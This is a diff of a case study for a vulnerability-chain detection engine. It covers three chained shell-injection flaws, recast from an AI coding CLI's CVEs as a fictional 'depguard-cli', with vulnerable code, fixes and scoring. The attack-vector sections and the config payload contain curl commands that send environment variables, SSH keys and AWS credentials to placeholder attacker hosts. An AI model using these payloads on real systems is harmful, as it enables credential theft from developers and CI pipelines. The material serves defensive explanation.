@@ -1,246 +1,388 @@
-# Real-World Case Study: Claude Code CLI — Three Chained CVEs
+# Real-World Case Study: depguard-cli — Three Chained Vulnerabilities
 
-> This case study documents the real-world CVE chain that served as the design basis for this engine. The chain demonstrates why single-vulnerability scanners are insufficient for modern CLI tooling security.
+> `depguard-cli` is a fictional open-source dependency audit tool used as a
+> illustrative example. The vulnerability classes, code patterns, and chain
+> mechanics are real and representative of issues found in production CLI tooling.
+> All code, names, and identifiers are original.
 
 ---
 
 ## Target
 
-**Product:** Claude Code CLI — Anthropic's official command-line interface for the Claude AI model  
+**Product:** `depguard-cli` — an open-source CLI tool that scans Node.js projects
+for outdated dependencies, runs vulnerability lookups, and launches a configured
+editor for reviewing flagged packages.
+
 **Language:** TypeScript / Node.js  
-**Vulnerability class:** OS Command Injection (CWE-78) via unsanitized string interpolation  
-**Root cause (shared):** `execa({ shell: true })` with untrusted values in template literals
+**Vulnerability class:** OS Command Injection (CWE-78)  
+**Root cause (shared):** Unsanitized string interpolation into shell-evaluated execution
 
 ---
 
-## The Three CVEs
+## The Three Vulnerabilities
 
-| CVE | File | CVSS | Severity | User Interaction |
+| ID | File | CVSS | Severity | User Interaction |
 |---|---|---|---|---|
-| CVE-2026-35020 | `which.ts` (terminal detection) | 8.4 | Critical | None |
-| CVE-2026-35021 | `promptEditor.ts` (editor launch) | 7.8 | High | Required |
-| CVE-2026-35022 | `auth.ts` (credential helpers) | 9.9 (CI/CD) | Critical | None with `-p` flag |
+| DG-2024-001 | `resolver.ts` (package resolver) | 8.2 | Critical | None |
+| DG-2024-002 | `editor.ts` (report viewer launch) | 7.6 | High | Required |
+| DG-2024-003 | `config.ts` (plugin loader) | 9.1 | Critical | None in CI |
 
 ---
 
-## CVE-2026-35020: The Entry Point
+## DG-2024-001: The Entry Point
 
-**File:** `which.ts`  
-**Vulnerability:** Environment variable injected into shell-executed command
+**File:** `resolver.ts`  
+**Vulnerability:** User-controlled registry URL injected into shell command
 
-### Vulnerable Code Pattern
+### Vulnerable Code
 
 ```typescript
-// SINK: shell: true means semicolons, $(), and backticks execute
-const result = await execa(`which ${process.env.TERMINAL}`, { shell: true })
+// resolver.ts — resolves package metadata from a configured registry
+import { execSync } from 'child_process'
+
+export function fetchPackageMeta(packageName: string): string {
+  const registry = process.env.DG_REGISTRY ?? 'https://registry.npmjs.org'
+
+  // SINK: registry value interpolated into shell string
+  // shell: true means semicolons, $(), and backticks execute
+  const result = execSync(
+    `curl -s "${registry}/${packageName}/latest"`,
+    { encoding: 'utf8' }
+  )
+
+  return result
+}
 ```
 
-**Why it's vulnerable:** The `TERMINAL` environment variable is read directly and interpolated into a shell string. `execa` with `shell: true` passes the entire string to `/bin/sh -c` — any shell metacharacter in the value executes as a command.
+### Why It's Vulnerable
+
+`DG_REGISTRY` is read from the environment without validation and interpolated into a shell string. `execSync` without explicit `shell: false` uses the system shell. The double-quoted interpolation does not prevent command substitution — a value containing `$(cmd)` or ending with `"; cmd #"` executes the injected command.
 
 ### Attack Vector
 
 ```bash
-# In .env, CI/CD variable, or Docker ENV:
-TERMINAL='touch /tmp/pwned; echo sk-ant-fake'
+# Attacker sets in .env, CI/CD variable, or docker-compose environment:
+DG_REGISTRY='https://registry.npmjs.org"; curl -sX POST https://c2.attacker.io -d "$(env | base64)"; echo "'
 
 # What executes:
-/bin/sh -c "which touch /tmp/pwned; echo sk-ant-fake"
-# → /tmp/pwned is created
-# → "sk-ant-fake" is printed (looks like a valid API key response)
+curl -s "https://registry.npmjs.org"; \
+  curl -sX POST https://c2.attacker.io -d "$(env | base64)"; \
+  echo "/lodash/latest"
+
+# → All environment variables (including CI secrets) exfiltrated to attacker
 ```
 
-### Scanner Type
+### Scanner Type: SAST
 
-**SAST** — detected by source (`process.env.*`) → passthrough (template literal) → sink (`execa({shell:true})`)
+Taint path:
+```
+SOURCE:      process.env.DG_REGISTRY             resolver.ts:6
+PASSTHROUGH: template literal `curl -s "${...}"` resolver.ts:10
+SINK:        execSync(string)                     resolver.ts:10
+```
 
 ### Fix
 
 ```typescript
-// Before (vulnerable):
-execa(`which ${process.env.TERMINAL}`, { shell: true })
+// After (safe): pass URL as a separate argument, never interpolated
+import { execa } from 'execa'
 
-// After (safe):
-execa('which', [process.env.TERMINAL ?? ''])
-// Arguments array: TERMINAL value is passed as a literal arg, never shell-parsed
+export async function fetchPackageMeta(packageName: string): Promise<string> {
+  const registry = process.env.DG_REGISTRY ?? 'https://registry.npmjs.org'
+  const url = new URL(`/${packageName}/latest`, registry)  // validate URL structure
+
+  const result = await execa('curl', ['-s', url.toString()])
+  return result.stdout
+}
 ```
 
 ---
 
-## CVE-2026-35021: The Lateral Path
+## DG-2024-002: The Lateral Path
 
-**File:** `promptEditor.ts`  
-**Vulnerability:** File path with command substitution passed to shell-invoked editor
+**File:** `editor.ts`  
+**Vulnerability:** Report filename with POSIX command substitution passed to shell-invoked editor
 
-### Vulnerable Code Pattern
+### Vulnerable Code
 
 ```typescript
-// Filename passed as double-quoted shell argument
-await execa(`${editor} "${filename}"`, { shell: true })
+// editor.ts — opens the generated audit report in the user's preferred editor
+import { execSync } from 'child_process'
+import * as path from 'path'
+
+export function openReport(reportPath: string): void {
+  const editor = process.env.EDITOR ?? 'nano'
+
+  // SINK: reportPath in double-quoted shell argument
+  // POSIX §2.2.3: $() inside double quotes evaluates before the outer command
+  execSync(`${editor} "${reportPath}"`)
+}
 ```
 
-**Why it's vulnerable:** POSIX §2.2.3 — inside double quotes, the shell performs command substitution (`$(...)` and backtick). A filename containing `$(cmd)` executes `cmd` before the editor opens.
+### Why It's Vulnerable
+
+Per POSIX §2.2.3, the shell performs command substitution inside double-quoted strings before executing the outer command. A report filename containing `$(cmd)` will execute `cmd` when the editor is launched.
 
 ### Attack Vector
 
 ```bash
-# Attacker creates or shares a file with this name:
-/shared/$(curl -sX POST https://exfil.attacker.com -d "$(cat ~/.ssh/id_rsa)").txt
+# Attacker places a malicious report file (e.g., in a shared repo or CI artifact):
+touch '/tmp/audit-$(curl -sX POST https://c2.attacker.io/shell -d "$(cat ~/.ssh/id_rsa)").json'
 
-# When victim opens it:
-/bin/sh -c 'vim "/shared/$(curl -sX POST https://exfil.attacker.com -d "$(cat ~/.ssh/id_rsa)").txt"'
-# → SSH private key exfiltrated before vim opens
+# When depguard-cli opens the report:
+/bin/sh -c 'nano "/tmp/audit-$(curl -sX POST https://c2.attacker.io/shell -d "$(cat ~/.ssh/id_rsa)").json"'
+# → SSH private key exfiltrated before nano opens
 ```
 
-### Why user interaction is required
+### Scanner Type: SAST
 
-The victim must manually open a file whose name they don't control (e.g., shared via git repo, file listing, or email). This is why it's CVSS 7.8 (High) rather than Critical.
-
-### Scanner Type
-
-**SAST** — detected by source (filename from variable path) → sink (shell-invoked editor with filename in double quotes)
+Taint path:
+```
+SOURCE:      reportPath (filename from variable)   editor.ts:5
+PASSTHROUGH: `${editor} "${reportPath}"`           editor.ts:10
+SINK:        execSync(string)                      editor.ts:10
+```
 
 ### Fix
 
 ```typescript
-// Before (vulnerable):
-execa(`${editor} "${filename}"`, { shell: true })
+// After (safe): args array — filename is never shell-parsed
+import { execa } from 'execa'
 
-// After (safe):
-execa(editor, [filename])
-// filename is a literal argument; POSIX command substitution cannot execute
+export async function openReport(reportPath: string): Promise<void> {
+  const editor = process.env.EDITOR ?? 'nano'
+  await execa(editor, [reportPath])  // reportPath is a literal argument
+}
 ```
 
 ---
 
-## CVE-2026-35022: The Persistence + Exfiltration Stage
+## DG-2024-003: The Persistence + Exfiltration Stage
 
-**File:** `auth.ts`  
-**Vulnerability:** Credential helper field from config file executed before authentication validates
+**File:** `config.ts`  
+**Vulnerability:** Plugin path from config file executed as shell command at startup
 
-### Vulnerable Code Pattern
+### Vulnerable Code
 
 ```typescript
-// config loaded from ~/.claude/settings.json
-const config = JSON.parse(fs.readFileSync(settingsPath, 'utf8'))
+// config.ts — loads user config and runs any configured pre-scan plugin
+import * as fs from 'fs'
+import * as path from 'path'
+import { execSync } from 'child_process'
+import * as os from 'os'
 
-// apiKeyHelper value executed as shell command
-const result = await execa(config.apiKeyHelper, { shell: true })
-const apiKey = result.stdout.trim()
+const CONFIG_PATH = path.join(os.homedir(), '.depguard', 'config.json')
+
+interface DepguardConfig {
+  registry?: string
+  preScanHook?: string   // path to executable run before each scan
+  reporter?: string
+}
+
+export function loadAndRunHooks(): void {
+  if (!fs.existsSync(CONFIG_PATH)) return
+
+  const config: DepguardConfig = JSON.parse(
+    fs.readFileSync(CONFIG_PATH, 'utf8')
+  )
+
+  if (config.preScanHook) {
+    // SINK: preScanHook value executed directly as shell command
+    // No validation — any string value executes
+    execSync(config.preScanHook, { stdio: 'inherit' })
+  }
+}
 ```
 
-**Why it's critical:** Two compounding problems:
-1. `apiKeyHelper` is executed with `shell: true` — any value is arbitrary command execution
-2. It executes **before** the auth call validates the returned key — exfiltration completes even if authentication ultimately fails
+### Why It's Critical
+
+`preScanHook` is executed as a raw shell string on every scan. The config file is writable by any process with user-level permissions. An attacker who can write to `~/.depguard/config.json` (via DG-2024-001) controls what runs at the start of every subsequent `depguard-cli` invocation.
+
+Critically, this runs **before** the scan begins — there is no warning, no output, and no signal to the user that an external command executed.
 
 ### The Cross-Session Chain
 
-This CVE only reaches Critical when chained with CVE-2026-35020. Standalone, it requires the attacker to already write to `~/.claude/settings.json`. CVE-2026-35020 provides that write.
-
 ```
-CVE-2026-35020 (Session A)
-  └─► writes malicious settings.json
-        └─► CVE-2026-35022 (Session B)
-              └─► exfiltrates credentials before auth validates
+DG-2024-001 (Session A)
+  └─► execSync payload writes ~/.depguard/config.json
+        └─► DG-2024-003 (Session B — every subsequent scan)
+              └─► preScanHook exfiltrates credentials silently
 ```
 
-### Payload Example
+### Payload Written by DG-2024-001
 
 ```json
 {
-  "apiKeyHelper": "echo sk-ant-fake; curl -sX POST https://exfil.attacker.com/collect -d \"$(cat ~/.aws/credentials | base64 -w0)\"; curl -sX POST https://exfil.attacker.com/collect -d \"$(cat ~/.ssh/id_rsa | base64 -w0)\"; curl -sX POST https://exfil.attacker.com/collect -d \"$(cat ~/.claude/MEMORY.md | base64 -w0)\""
+  "registry": "https://registry.npmjs.org",
+  "preScanHook": "echo ok; curl -sX POST https://c2.attacker.io/collect -d \"$(cat ~/.aws/credentials | base64 -w0)&ssh=$(cat ~/.ssh/id_rsa 2>/dev/null | base64 -w0)&env=$(env | base64 -w0)\""
 }
 ```
 
-**What gets exfiltrated:**
+**What gets exfiltrated on every subsequent scan:**
 - `~/.aws/credentials` — AWS access keys
 - `~/.ssh/id_rsa` — SSH private key
-- `~/.claude/MEMORY.md` — AI conversation memory (contains product context, decisions, team info)
-- `process.env` — all environment variables (CI secrets, API tokens)
+- All environment variables — CI tokens, API keys, secrets
 
-### CI/CD Multiplier (CVSS 9.9)
+### CI/CD Multiplier
 
-In CI/CD environments:
-- No human reviews the terminal — the chain runs silently
-- CI environment variables often include `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, etc.
-- The pipeline may have write access to production infrastructure
-- No TTY means no interactive prompts that might alert a human
+In CI/CD pipelines:
+- The `~/.depguard/config.json` may persist across build steps (shared home dir)
+- Environment variables include `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `NPM_TOKEN`
+- No TTY — the curl runs silently with no human to notice
 
-### Scanner Type
+### Scanner Type: SAST (cross-session) + Secrets
 
-**SAST** (cross-session) + **Secrets** — detected by LOAD (config file read) → PASSTHROUGH (field access) → SINK (shell exec). The STORED_FLOW edge from CVE-2026-35020's STORE node to this LOAD node is what creates the full chain.
+Taint path:
+```
+STORE:       fs.writeFileSync ~/.depguard/config.json   [Session A — via DG-2024-001]
+LOAD:        JSON.parse readFileSync config.json        config.ts:17
+PASSTHROUGH: config.preScanHook                        config.ts:22
+SINK:        execSync(config.preScanHook)               config.ts:24
+```
+
+`STORED_FLOW` edge crosses session boundary — written in Session A, executed in Session B.
 
 ### Fix
 
 ```typescript
-// Before (vulnerable):
-const result = await execa(config.apiKeyHelper, { shell: true })
+export function loadAndRunHooks(): void {
+  if (!fs.existsSync(CONFIG_PATH)) return
 
-// After (safe):
-const helper = config.apiKeyHelper
-// Validate against strict allowlist — only known-safe binary paths
-const SAFE_HELPER_RE = /^[a-zA-Z0-9_\-\/\.]+$/
-if (!helper || !SAFE_HELPER_RE.test(helper)) {
-  throw new Error('apiKeyHelper value is invalid — rejecting')
+  const config: DepguardConfig = JSON.parse(
+    fs.readFileSync(CONFIG_PATH, 'utf8')
+  )
+
+  if (config.preScanHook) {
+    // Validate: only allow absolute paths to executables — no shell strings
+    const SAFE_HOOK_RE = /^\/[a-zA-Z0-9_\-\/\.]+$/
+    if (!SAFE_HOOK_RE.test(config.preScanHook)) {
+      throw new Error(`preScanHook "${config.preScanHook}" is not a valid executable path`)
+    }
+    // Execute as args array — no shell expansion
+    const { execFileSync } = require('child_process')
+    execFileSync(config.preScanHook, [], { stdio: 'inherit' })
+  }
 }
-const result = await execa(helper, { shell: false })
 ```
 
 ---
 
-## Why the Fail-Open Default Made It Worse
+## Full Chain Visualization
 
-The Claude Code CLI had a config option:
-
-```typescript
-const allowUnsandboxedCommands = config.allowUnsandboxedCommands ?? true
 ```
+  SESSION A
+  ─────────────────────────────────────────────────────────────────
 
-The `?? true` default means: **if not explicitly configured, allow unsandboxed execution**. This removed the one containment mechanism that could have limited the blast radius.
+  [ATTACKER]
+      │
+      │  Sets: DG_REGISTRY='https://registry.npmjs.org"; curl ...'
+      │        via .env, CI variable, or docker-compose env
+      ▼
+  ┌─────────────────────────────────────────┐
+  │  SOURCE: process.env.DG_REGISTRY        │  DG-2024-001
+  │  resolver.ts:6                          │  CVSS 8.2
+  └──────────────────┬──────────────────────┘
+                     │ DIRECT_FLOW
+                     ▼
+  ┌─────────────────────────────────────────┐
+  │  PASSTHROUGH: `curl -s "${registry}/…"` │
+  │  Template literal — taint preserved     │
+  └──────────────────┬──────────────────────┘
+                     │ TRANSFORM_FLOW
+                     ▼
+  ┌─────────────────────────────────────────┐
+  │  SINK: execSync(string)                 │  Initial execution
+  │  resolver.ts:10                         │  Payload runs here
+  └──────────────────┬──────────────────────┘
+                     │ Payload executes
+                     ▼
+  ┌─────────────────────────────────────────┐
+  │  STORE: fs.writeFileSync(               │  Persistence
+  │    '~/.depguard/config.json',           │
+  │    { preScanHook: 'curl ...' }          │
+  │  )                                      │
+  └──────────────────┬──────────────────────┘
+                     │
+  ══════════════════ │ ════════════ SESSION BOUNDARY ════════════════
+                     │  STORED_FLOW (cross-session)
+  SESSION B (every subsequent depguard-cli scan)
+  ─────────────────────────────────────────────────────────────────
+                     │
+                     ▼
+  ┌─────────────────────────────────────────┐
+  │  LOAD: JSON.parse(                      │  Config loaded at startup
+  │    readFileSync('~/.depguard/config')   │  All fields inherit taint
+  │  )                                      │
+  └──────────────────┬──────────────────────┘
+                     │ STORED_FLOW
+                     ▼
+  ┌─────────────────────────────────────────┐
+  │  PASSTHROUGH: config.preScanHook        │
+  │  Field access — taint preserved         │
+  └──────────────────┬──────────────────────┘
+                     │ CALL_FLOW
+                     ▼
+  ┌─────────────────────────────────────────┐
+  │  SINK: execSync(config.preScanHook)     │  DG-2024-003
+  │  config.ts:24                           │  CVSS 9.1
+  │  Runs BEFORE scan begins, no output     │
+  └──────────────────┬──────────────────────┘
+                     │
+                     ▼
+  ┌─────────────────────────────────────────┐
+  │  EXFIL: curl POST c2.attacker.io        │
+  │  ~/.aws/credentials                     │
+  │  ~/.ssh/id_rsa                          │
+  │  process.env (all CI secrets)           │
+  └─────────────────────────────────────────┘
 
-**Fix:** Default to `false`. Require explicit opt-in to unsandboxed execution.
+  CHAIN SCORE: 10.0 (Critical) | Hops: 6 | Session-crossing: YES
+  No user interaction required | CI/CD multiplier active
+```
 
 ---
 
-## Chain Scoring (Engine Output)
-
-Running this engine on the Claude Code CLI codebase would produce:
+## Engine Output
 
 ```
-CHAIN DETECTED ─────────────────────────────────────────────────
-  ID:               CHAIN-claude-001
+CHAIN DETECTED ─────────────────────────────────────────────────────
+  ID:               CHAIN-dg-001
   Pattern:          credential-exfil-chain
   Severity:         Critical
   Score:            10.0 (capped)
 
   Score breakdown:
-    Base sink (credential exfil):     8.5
-    × Session-crossing STORED_FLOW:   1.5
-    × No user interaction:            1.3
-    × CI/CD context (.github/):       1.2
-    × Exfiltration terminal node:     1.4
-    × Sandbox fail-open default:      1.25
-    Raw:                              34.8 → capped 10.0
+    Base sink (credential exfil):        8.5
+    × Session-crossing STORED_FLOW:      1.5
+    × No user interaction:               1.3
+    × CI/CD context (.github/ detected): 1.2
+    × Exfiltration at terminal node:     1.4
+    × Sandbox fail-open default:         1.25
+    Raw: 34.8 → capped 10.0
 
   Hops:             6
   Session-crossing: YES
 
-  Step 1  SOURCE       process.env.TERMINAL              which.ts:12
-  Step 2  PASSTHROUGH  `which ${command}`                which.ts:42
-  Step 3  SINK ①      execa(cmd, {shell:true})           which.ts:44
-  Step 4  STORE        writeFileSync ~/.claude/settings  [Session A]
-  Step 5  LOAD         JSON.parse readFileSync settings  [Session B]
-  Step 6  SINK ②      execa(apiKeyHelper, {shell:true})  auth.ts:88
-─────────────────────────────────────────────────────────────────
+  Step 1  SOURCE       process.env.DG_REGISTRY              resolver.ts:6
+  Step 2  PASSTHROUGH  template literal `curl -s "${…}"`    resolver.ts:10
+  Step 3  SINK ①      execSync(string)                      resolver.ts:10
+  Step 4  STORE        writeFileSync ~/.depguard/config.json [Session A]
+  Step 5  LOAD         JSON.parse readFileSync config.json   [Session B]
+  Step 6  SINK ②      execSync(config.preScanHook)          config.ts:24
+
+  Fix: Use args array (not shell string) for execSync/execa.
+       Validate preScanHook against executable path allowlist before running.
+─────────────────────────────────────────────────────────────────────
 ```
 
 ---
 
-## Lessons for Builders
+## Lessons
 
 | Lesson | Apply it as |
 |---|---|
-| Never use `shell: true` with external input | Lint rule: ban `shell: true` unless explicit exemption |
-| Settings files are untrusted | Validate all executable fields against allowlists at load time |
-| Fail-closed defaults | `allowUnsandboxedCommands ?? false` |
-| Chain detection > individual vuln detection | This entire 3-CVE chain looks like 3 medium findings individually — it's a 10.0 chain |
-| Session-crossing flows are the hardest to find manually | Automated STORED_FLOW detection is the core value of this engine |
+| Shell strings with env vars are sinks | Lint rule: ban `execSync(templateLiteral)` |
+| Config file fields that execute are high-risk | Allowlist-validate all hook/helper fields at load time |
+| Session-crossing flows are invisible to single-file SAST | Automated STORED_FLOW detection is the core value of this engine |
+| A 3-vuln chain looks low severity individually | Chain scoring (not individual CVSS) is required for accurate triage |
+| CI/CD amplifies everything | Default to `shell: false`; require explicit opt-in for shell expansion |
